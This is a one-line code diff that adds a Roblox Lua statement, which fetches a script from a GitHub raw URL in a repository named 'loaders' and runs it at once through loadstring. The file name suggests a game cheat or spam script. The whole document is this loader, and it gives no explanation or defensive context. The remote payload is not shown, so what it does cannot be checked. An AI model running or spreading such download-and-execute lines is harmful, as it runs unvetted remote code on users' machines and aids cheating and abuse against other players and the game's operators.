@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/1-stone-skipping-spam3-ddj55337o2meqb.lua"))()
